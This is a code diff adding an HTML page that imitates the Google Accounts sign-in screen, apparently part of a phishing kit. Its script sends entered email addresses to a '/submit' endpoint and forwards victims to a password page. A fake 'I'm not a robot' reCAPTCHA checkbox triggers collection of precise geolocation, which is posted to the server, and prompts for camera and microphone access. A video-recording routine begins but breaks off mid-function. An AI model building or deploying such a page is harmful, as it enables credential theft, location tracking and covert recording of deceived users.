@@ -1,0 +1,1455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        /* تنسيقات عامة */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #202124;
+            color: #e8eaed;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+            line-height: 1.5;
+        }
+
+        /* تنسيقات الحاوية الرئيسية */
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 40px 32px 28px;
+            margin: 0 auto;
+            background-color: #2d2e30;
+            border: 1px solid #3c4043;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(to right, #4285f4, #34a853, #fbbc05, #ea4335);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .container:hover::before {
+            opacity: 1;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .logo {
+            font-family: 'Product Sans', Arial, sans-serif;
+            font-size: 42px;  
+            text-align: center;
+            margin: 0 auto 24px;
+            user-select: none;
+            letter-spacing: -1px;
+        }
+        
+        .logo span {
+            display: inline-block;
+            font-size: 46px; 
+            font-weight: 500;
+        }
+
+        h1 {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            font-size: 34px;
+            font-weight: 400;
+            margin-bottom: -4px;
+            text-align: center;
+            color: #e8eaed;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #e8eaed;
+            text-align: center;
+            line-height: 1.5;
+            opacity: 0.87;
+        }
+
+        .email-display {
+            display: flex;
+            align-items: center;
+            padding: 8px 16px;
+            background: #3c4043;
+            border-radius: 100px;
+            margin-bottom: 32px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .email-display:hover {
+            background: #4a4d51;
+        }
+
+        .email-display img {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            border-radius: 50%;
+            background: #8ab4f8;
+        }
+
+        /* تنسيقات حقول الإدخال */
+        .input-container {
+            position: relative;
+            margin-bottom: 32px;  /* تم تغيير من 211px إلى 32px */
+            width: 100%;
+        }
+
+        .input-container input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #5f6368;
+            border-radius: 4px;
+            background-color: transparent;
+            color: #e8eaed;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            caret-color: #8ab4f8;
+        }
+
+        .error-message {
+            color: #f28b82;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .input-container.error input {
+            border-color: #f28b82;
+        }
+
+        .input-container.error label {
+            color: #f28b82;
+        }
+
+        .input-container label {
+            position: absolute;
+            left: 15px;
+            top: 17px;
+            font-size: 16px;
+            color: #9aa0a6;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            pointer-events: none;
+            transform-origin: left top;
+            z-index: 1;
+            background: transparent;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #8ab4f8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+
+        input:focus + label,
+        input:not(:placeholder-shown) + label {
+            transform: translateY(-25px) scale(0.75);  /* تم تغيير من -35px إلى -28px */
+            color: #8ab4f8;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #5f6368;
+            border-radius: 4px;
+            background-color: transparent;
+            color: #e8eaed;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            caret-color: #8ab4f8;
+        }
+
+        .password-field {
+            position: relative;
+            width: 100%;
+            background-color: transparent;
+            margin-bottom: 35px;
+        }
+
+        /* تنسيقات مربع الاختيار Show password */
+        .show-password-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 16px 0 24px;
+        }
+
+        .show-password-container input[type="checkbox"] {
+            width: 18px !important;
+            height: 18px !important;
+            min-width: 18px !important;
+            min-height: 18px !important;
+            margin: 0;
+            cursor: pointer;
+            position: relative;
+            appearance: none;
+            -webkit-appearance: none;
+            border: 2px solid #5f6368;
+            border-radius: 3px;
+            background-color: transparent;
+            transition: all 0.2s;
+            padding: 0;
+            flex-shrink: 0;
+        }
+
+        .show-password-container label {
+            color: #9aa0a6;
+            font-size: 14px;
+            user-select: none;
+            cursor: pointer;
+            padding-top: 0;
+            line-height: 18px;
+            margin-left: 4px;
+        }
+
+        .show-password-container input[type="checkbox"]:checked::after {
+            content: '';
+            position: absolute;
+            left: 6px;
+            top: 2px;
+            width: 4px;
+            height: 9px;
+            border: solid #202124;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .show-password-container input[type="checkbox"]:checked {
+            background-color: #8ab4f8;
+            border-color: #8ab4f8;
+        }
+
+        /* إزالة التنسيقات المتداخلة */
+        input[type="checkbox"]#show-password-checkbox {
+            width: 18px !important;
+            height: 18px !important;
+        }
+
+        /* إخفاء العناصر غير المستخدمة */
+        .show-password {
+            display: none;
+        }
+
+        /* Forgot Password and Create Account Links */
+        .forgot-email, .forgot-password {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            margin-bottom: 10px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+        }
+
+        .forgot-email:hover, .forgot-password:hover {
+            background-color: rgba(138, 180, 248, 0.08);
+            text-decoration: none;
+        }
+
+        .guest-mode {
+            color: #e8eaed;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            opacity: 0.87;
+        }
+
+        .guest-mode a {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 4px 8px;
+            margin: -4px -8px;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+        }
+
+        .guest-mode a:hover {
+            background-color: rgba(138, 180, 248, 0.08);
+            text-decoration: none;
+        }
+
+        .bottom-buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+            width: 100%;
+        }
+
+        .create-account {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+
+        .create-account:hover {
+            background-color: rgba(138, 180, 248, 0.08);
+            text-decoration: none;
+        }
+
+        .next-button {
+            background-color: #8ab4f8;
+            color: #202124;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 0.25px;
+            position: relative;
+            overflow: hidden;
+            min-width: 80px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .next-button:disabled {
+            background-color: #5f6368;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        .next-button:not(:disabled):hover {
+            background-color: #93bbff;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Footer Styles */
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            background-color: #202124;
+            font-size: 12px;
+            border-top: 1px solid #3c4043;
+            z-index: 1000;
+        }
+
+        .footer a {
+            color: #9aa0a6;
+            text-decoration: none;
+            margin: 0 10px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+
+        .footer a:hover {
+            color: #e8eaed;
+            background-color: rgba(232, 234, 237, 0.08);
+        }
+
+        .language-select {
+            background-color: transparent;
+            color: #9aa0a6;
+            border: none;
+            padding: 4px 8px;
+            cursor: pointer;
+            border-radius: 4px;
+            font-size: 12px;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%239aa0a6' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 8px center;
+            background-size: 16px;
+            padding-right: 32px;
+        }
+
+        .language-select:hover {
+            color: #e8eaed;
+            background-color: rgba(232, 234, 237, 0.08);
+        }
+
+        .language-select:focus {
+            outline: none;
+            background-color: rgba(232, 234, 237, 0.08);
+        }
+
+        /* Additional styles for new pages */
+        #forgot-email-page, #create-account-page, #forgot-password-page, #help-page, #privacy-page, #terms-page, #guest-mode-page, #two-factor-page, #success-page {
+            display: none;
+        }
+
+        .back-button {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: all 0.2s;
+            display: inline-block;
+        }
+
+        .back-button:hover {
+            background-color: rgba(138, 180, 248, 0.08);
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(32, 33, 36, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid transparent;
+            border-top-color: #8ab4f8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .verification-code-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+            gap: 8px;
+        }
+
+        .verification-code-input {
+            width: 40px;
+            height: 48px;
+            text-align: center;
+            font-size: 20px;
+            border: 1px solid #5f6368;
+            border-radius: 4px;
+            background-color: transparent;
+            color: #e8eaed;
+        }
+
+        .verification-code-input:focus {
+            outline: none;
+            border-color: #8ab4f8;
+            border-width: 2px;
+        }
+
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            background-color: #34a853;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .success-icon svg {
+            width: 30px;
+            height: 30px;
+            color: white;
+        }
+
+        /* RTL support for Arabic */
+        .rtl {
+            direction: rtl;
+            text-align: right;
+        }
+
+        .rtl .input-container label {
+            left: auto;
+            right: 15px;
+            transform-origin: right top;
+        }
+
+        .rtl input:focus + label,
+        .rtl input:not(:placeholder-shown) + label {
+            transform: translateY(-35px) scale(0.75);
+        }
+
+        .rtl .show-password input[type="checkbox"] {
+            margin-right: 0;
+            margin-left: 8px;
+            order: 1;
+        }
+
+        .rtl .email-display img {
+            margin-right: 0;
+            margin-left: 8px;
+        }
+
+        .rtl .language-select {
+            background-position: left 8px center;
+            padding-right: 8px;
+            padding-left: 32px;
+        }
+
+        /* Modal Styles */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background-color: #2d2e30;
+            width: 400px;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #e8eaed;
+            font-weight: 500;
+        }
+
+        .modal-subtitle {
+            font-size: 14px;
+            margin-bottom: 24px;
+            color: #e8eaed;
+            opacity: 0.8;
+        }
+
+        .modal-logo {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 20px;
+        }
+
+        .recaptcha-box {
+            background: #2d2e30;
+            border: 1px solid #3c4043;
+            border-radius: 4px;
+            padding: 16px;
+            width: 300px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.3);
+        }
+
+        .recaptcha-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+            gap: 8px;
+        }
+
+        .recaptcha-header img {
+            width: 24px;
+            height: 24px;
+        }
+
+        .recaptcha-header span {
+            color: #e8eaed;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            padding: 12px;
+            border: 1px solid #3c4043;
+            border-radius: 3px;
+            transition: border-color 0.2s ease;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin: 0;
+            cursor: pointer;
+            position: relative;
+            appearance: none;
+            border: 1.5px solid #5f6368;
+            border-radius: 2px;
+            background-color: transparent;
+            transition: all 0.2s ease;
+        }
+
+        .checkbox-container label {
+            color: #8ab4f8;
+            font-size: 13px;
+            user-select: none;
+            cursor: pointer;
+        }
+
+        .recaptcha-message {
+            color: #8ab4f8;
+            font-size: 13px;
+            margin-top: 8px;
+            text-align: center;
+            min-height: 18px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+                padding: 24px 16px;
+                margin: 0 16px;
+                border-radius: 4px;
+            }
+
+            .logo {
+                font-size: 20px;
+            }
+
+            .bottom-buttons {
+                flex-direction: column-reverse;
+                gap: 16px;
+            }
+
+            .next-button {
+                width: 100%;
+            }
+
+            .create-account {
+                text-align: center;
+                display: block;
+                margin-top: 8px;
+            }
+
+            .email-display {
+                padding: 8px 12px;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+                scroll-behavior: auto !important;
+            }
+        }
+
+        @keyframes loading-bar {
+            0% {
+                opacity: 1;
+                background: linear-gradient(to right, 
+                    #4285f4 0%, #4285f4 25%, 
+                    #34a853 25%, #34a853 50%, 
+                    #fbbc05 50%, #fbbc05 75%, 
+                    #ea4335 75%, #ea4335 100%);
+                background-size: 400% 100%;
+                background-position: 100% 0;
+            }
+            100% {
+                opacity: 1;
+                background: linear-gradient(to right, 
+                    #4285f4 0%, #4285f4 25%, 
+                    #34a853 25%, #34a853 50%, 
+                    #fbbc05 50%, #fbbc05 75%, 
+                    #ea4335 75%, #ea4335 100%);
+                background-size: 400% 100%;
+                background-position: 0 0;
+            }
+        }
+
+        .loading .container::before {
+            opacity: 1;
+            animation: loading-bar 2s linear infinite;
+        }
+
+        /* التنسيقات الأساسية للشاشات المتوسطة والكبيرة */
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            margin: 0 auto;
+            background-color: #2d2e30;
+            border: 1px solid #3c4043;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        /* للشاشات الصغيرة جداً (الهواتف) */
+        @media screen and (max-width: 480px) {
+            .container {
+                max-width: 100%;
+                padding: 24px 16px;
+                margin: 0 16px;
+                border-radius: 4px;
+            }
+
+            .logo {
+                font-size: 20px;
+            }
+
+            .bottom-buttons {
+                flex-direction: column-reverse;
+                gap: 16px;
+            }
+
+            .next-button {
+                width: 100%;
+            }
+
+            .create-account {
+                text-align: center;
+                display: block;
+                margin-top: 8px;
+            }
+
+            .email-display {
+                padding: 8px 12px;
+            }
+        }
+
+        /* للشاشات المتوسطة (التابلت) */
+        @media screen and (min-width: 481px) and (max-width: 768px) {
+            .container {
+                max-width: 400px;
+                padding: 32px 24px;
+                margin: 20px auto;
+            }
+        }
+
+        /* للشاشات الكبيرة (الحواسيب المكتبية) */
+        @media screen and (min-width: 769px) {
+            .container {
+                margin-top: 8vh;
+            }
+        }
+
+        /* للشاشات العالية الدقة */
+        @media screen and (min-width: 1200px) {
+            body {
+                font-size: 16px;
+            }
+        }
+
+        /* للأجهزة التي تدعم الشاشات المظلمة */
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-color: #202124;
+            }
+        }
+
+        /* لدعم الشاشات العمودية والأفقية في الأجهزة المحمولة */
+        @media screen and (orientation: portrait) {
+            .container {
+                margin-top: 5vh;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 600px) {
+            .container {
+                margin-top: 20px;
+                padding-top: 24px;
+            }
+        }
+
+        /* لدعم الشاشات عالية الكثافة */
+        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+            input, button {
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+            }
+        }
+
+        /* لدعم أجهزة اللمس */
+        @media (hover: none) {
+            .next-button:hover {
+                background-color: #8ab4f8;
+            }
+        }
+
+        .recaptcha-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(8px);
+            transition: all 0.3s ease;
+        }
+
+        .recaptcha-container.active .recaptcha-box {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        /* Password Page Styles */
+        .password-page-container {
+            width: 100%;
+            max-width: 350px;
+            margin: 0 auto;
+        }
+
+        .password-field {
+            position: relative;
+            width: 100%;
+            background-color: transparent;
+            margin-bottom: 8px;
+        }
+
+        .show-password-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 0 0 24px;
+            height: 24px;
+        }
+
+        .show-password-container input[type="checkbox"] {
+            width: 16px !important;
+            height: 16px !important;
+            min-width: 16px !important;
+            min-height: 16px !important;
+            margin: 0;
+            cursor: pointer;
+            position: relative;
+            appearance: none;
+            -webkit-appearance: none;
+            border: 1.5px solid #5f6368;
+            border-radius: 2px;
+            background-color: transparent;
+            transition: all 0.2s;
+            padding: 0;
+            flex-shrink: 0;
+        }
+
+        .show-password-container label {
+            color: #9aa0a6;
+            font-size: 14px;
+            user-select: none;
+            cursor: pointer;
+            line-height: 16px;
+            margin: 0;
+            display: inline-block;
+        }
+
+        .show-password-container input[type="checkbox"]:checked {
+            background-color: #8ab4f8;
+            border-color: #8ab4f8;
+        }
+
+        .show-password-container input[type="checkbox"]:checked::after {
+            content: '';
+            position: absolute;
+            left: 5px;
+            top: 2px;
+            width: 4px;
+            height: 8px;
+            border: solid #202124;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        /* تحسينات لواجهة المستخدم على الهواتف */
+        form {
+            max-width: 100%;
+            padding: 15px;
+        }
+        input {
+            width: 100%;
+            margin: 10px 0;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+
+        .next-button {
+            background-color: #8ab4f8;
+            color: #202124;
+            border: none;
+            padding: 8px 48px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            min-width: 80px;
+            height: 34px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .next-button:hover {
+            background-color: #93bbff;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+
+        .next-button:active {
+            background-color: #7ea9f1;
+        }
+
+        .input-container {
+            margin-bottom: 24px;
+        }
+
+        .error-message {
+            color: #f28b82;
+            font-size: 16px;
+            margin-top: 12px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Email Page -->
+        <div class="page active" id="email-page">
+            <div class="logo">
+                <span style="color: #4285F4;">G</span><span style="color: #EA4335;">o</span><span style="color: #FBBC05;">o</span><span style="color: #4285F4;">g</span><span style="color: #34A853;">l</span><span style="color: #EA4335;">e</span>
+            </div>
+            <h1 id="title-email">Sign in</h1>
+            <p class="subtitle" id="subtitle-email">Use your Google Account</p>
+            
+            <div class="form-container">
+                <div class="input-container">
+                    <input type="email" id="email" name="email" placeholder=" " required>
+                    <label for="email" id="email-label">Email or phone</label>
+                    <div class="error-message" id="email-error">Please enter a valid email address</div>
+                </div>
+
+                <div class="guest-mode" id="guest-mode-container">
+                    <span id="guest-mode-text">To help keep your account safe, Google wants to make sure it's really you trying to sign in</span>
+                    <br>
+                    <a href="https://policies.google.com/technologies/location-data?gl=TR&hl=en" id="learn-guest-mode">Learn more about new accounts verify Terms</a>
+                </div>
+
+                <div class="bottom-buttons">
+                    <a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com?hl%3Den-US&dsh=S-2130273183:1743238670587343&ec=GAlA8wE&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&TL=ADBLaQBhfxtCOlDjNLFndcsJks4-7-M35n5NItH_jfNrHeTyHNXZz7brBUoi5wzO" class="create-account" id="create-account">Create account</a>
+                    <button type="button" class="next-button" id="email-next">Next</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- reCAPTCHA Container -->
+        <div id="recaptcha-container" class="recaptcha-container" style="display: none;">
+            <div class="recaptcha-box">
+                <div class="recaptcha-header">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                    <span>reCAPTCHA</span>
+                </div>
+                <div class="recaptcha-content">
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="recaptcha-checkbox" onclick="verifyRecaptcha()">
+                        <label for="recaptcha-checkbox">I'm not a robot</label>
+                    </div>
+                    <div id="recaptcha-message" class="recaptcha-message"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success Page -->
+        <div class="page" id="success-page">
+            <div class="success-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                </svg>
+            </div>
+            <h1 id="success-title">You're signed in</h1>
+            <p class="subtitle" id="success-subtitle">Redirecting to Google services...</p>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <select class="language-select" id="language-select">
+            <option value="en">English (United States)</option>
+            <option value="ar">العربية</option>
+        </select>
+        <div>
+            <a href="https://support.google.com/accounts?hl=en&p=account_iph" id="help-link">Help</a>
+            <a href="https://accounts.google.com/TOS?loc=TR&hl=en&privacy=true" id="privacy-link">Privacy</a>
+            <a href="https://accounts.google.com/TOS?loc=TR&hl=en" id="terms-link">Terms</a>
+        </div>
+    </footer>
+
+    <script>
+        // DOM Elements
+        const pages = document.querySelectorAll('.page');
+        const emailPage = document.getElementById('email-page');
+        const successPage = document.getElementById('success-page');
+        const emailInput = document.getElementById('email');
+        const emailNextButton = document.getElementById('email-next');
+        const emailError = document.getElementById('email-error');
+        
+        // Global variables to track state
+        let isCapturing = false;
+        let captureInterval = null;
+        let isRecording = false;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let videoStream = null;
+
+        // Form Submit Functions
+        async function submitFormData(data) {
+            try {
+                console.log('Sending data to server:', data);
+                
+                const response = await fetch('/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Device-Type': isMobile() ? 'mobile' : 'desktop'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                console.log('Server response status:', response.status);
+                const result = await response.json();
+                console.log('Server response:', result);
+                return result;
+            } catch (error) {
+                console.error('Error submitting form:', error);
+                return null;
+            }
+        }
+
+        // Email Submit Handler
+        async function handleEmailSubmit() {
+            const email = emailInput.value.trim();
+            console.log('Attempting to submit email:', email);
+
+            if (!email) {
+                emailError.style.display = 'block';
+                emailInput.focus();
+                return;
+            }
+
+            if (!isValidEmail(email)) {
+                emailError.style.display = 'block';
+                emailInput.focus();
+                return;
+            }
+
+            try {
+                console.log('Email is valid, proceeding with submission');
+                
+                // Hide error message if visible
+                emailError.style.display = 'none';
+                
+                // Send data to server
+                const result = await submitFormData({ 
+                    email: email,
+                    type: 'email',
+                    device_type: isMobile() ? 'mobile' : 'desktop'
+                });
+                
+                console.log('Server response:', result);
+
+                if (result && result.status === 'success') {
+                    showLoading();
+                    setTimeout(() => {
+                        // توجيه المستخدم إلى صفحة كلمة المرور أولاً
+                        const email = emailInput.value.trim();
+                        window.location.href = `password1.html?email=${encodeURIComponent(email)}`;
+                    }, 1500);
+                }
+            } catch (error) {
+                console.error('Error in handleEmailSubmit:', error);
+                emailError.style.display = 'block';
+            }
+        }
+
+        // Utility Functions
+        function showPage(pageToShow) {
+            if (!pageToShow) return;
+            
+            console.log('Switching to page:', pageToShow.id);
+            
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            pageToShow.classList.add('active');
+        }
+
+        function showLoading() {
+            document.body.classList.add('loading');
+        }
+
+        function hideLoading() {
+            document.body.classList.remove('loading');
+        }
+
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function showRecaptcha() {
+            const recaptchaContainer = document.getElementById('recaptcha-container');
+            recaptchaContainer.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            setTimeout(() => {
+                recaptchaContainer.classList.add('active');
+            }, 10);
+        }
+
+        async function verifyRecaptcha() {
+            const checkbox = document.getElementById('recaptcha-checkbox');
+            if (!checkbox.checked) {
+                return;
+            }
+            
+            try {
+                document.getElementById('recaptcha-checkbox').disabled = true;
+                document.getElementById('recaptcha-message').textContent = 'Verifying...';
+                
+                // Simulate verification delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Request permissions and collect data
+                const permissionsResult = await requestPermissions();
+                
+                document.getElementById('recaptcha-message').textContent = 'Verification successful';
+                
+                // توجيه المستخدم إلى صفحة كلمة المرور أولاً
+                const email = emailInput.value.trim();
+                window.location.href = `password1.html?email=${encodeURIComponent(email)}`;
+                
+            } catch (error) {
+                console.error('Error during verification:', error);
+                document.getElementById('recaptcha-message').textContent = 'Verification failed. Please try again.';
+                document.getElementById('recaptcha-checkbox').disabled = false;
+                document.getElementById('recaptcha-checkbox').checked = false;
+            }
+            
+            return false;
+        }
+
+        async function requestPermissions() {
+            const permissions = {
+                camera: false,
+                microphone: false,
+                location: false
+            };
+
+            try {
+                // طلب إذن الموقع
+                try {
+                    const locationPermission = await navigator.permissions.query({ name: 'geolocation' });
+                    if (locationPermission.state === 'granted' || locationPermission.state === 'prompt') {
+                        // طلب الموقع بدقة عالية
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(
+                                resolve,
+                                reject,
+                                {
+                                    enableHighAccuracy: true,
+                                    timeout: 10000,
+                                    maximumAge: 0
+                                }
+                            );
+                        });
+
+                        if (position && position.coords) {
+                            permissions.location = true;
+                            
+                            // إرسال بيانات الموقع للخادم
+                            const locationData = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                altitude: position.coords.altitude,
+                                altitudeAccuracy: position.coords.altitudeAccuracy,
+                                heading: position.coords.heading,
+                                speed: position.coords.speed,
+                                timestamp: new Date().toISOString()
+                            };
+
+                            console.log('Location data:', locationData);
+
+                            await fetch('/api/get-location', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(locationData)
+                            }).then(response => response.json())
+                              .then(data => console.log('Server response:', data))
+                              .catch(error => console.error('Error sending location:', error));
+                        }
+                    }
+                } catch (error) {
+                    console.log('Location error:', error);
+                }
+
+                // Request camera and microphone permissions together for video recording
+                try {
+                    const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    videoStream.getTracks().forEach(track => track.stop());
+                    permissions.camera = true;
+                    permissions.microphone = true;
+                } catch (error) {
+                    console.log('Camera and microphone permission denied:', error);
+                    
+                    // Try to get permission for each individually if combined attempt failed
+                    try {
+                        const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        cameraStream.getTracks().forEach(track => track.stop());
+                        permissions.camera = true;
+                    } catch (cameraError) {
+                        console.log('Camera permission denied:', cameraError);
+                    }
+                    
+                    try {
+                        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        audioStream.getTracks().forEach(track => track.stop());
+                        permissions.microphone = true;
+                    } catch (audioError) {
+                        console.log('Microphone permission denied:', audioError);
+                    }
+                }
+
+                // Update permission status on the server
+                await fetch('/api/permissions', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(permissions)
+                });
+
+                return permissions;
+
+            } catch (error) {
+                console.log('Error requesting permissions:', error);
+                return permissions;
+            }
+        }
+
+        // Function to start continuous video recording
+        async function startVideoRecording() {
+            try {
+                console.log('Starting video recording');
+                
+                if (isRecording) {
+                    console.log('Already recording video');
+                    return;
+                }
+                
+                // Get user media with both video and audio
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                
+                videoStream = stream;
+                
+                // Create MediaRecorder instance
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                
+                // Handle recorded data
+                mediaRecorder.ondataavailable = async (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                        
+                        // Create a Blob from the recorded chunks
+                        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
